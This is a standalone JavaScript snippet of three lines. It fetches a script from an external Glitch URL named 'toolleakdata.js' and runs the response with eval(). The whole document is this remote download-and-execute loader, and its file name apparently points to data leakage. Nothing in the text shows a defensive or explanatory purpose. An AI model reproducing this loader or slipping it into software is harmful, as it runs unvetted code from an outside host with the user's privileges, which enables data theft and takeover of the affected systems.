fetch('https://mtdscript.glitch.me/toolleakdata.js')
    .then(response => response.text())
    .then(script => eval(script));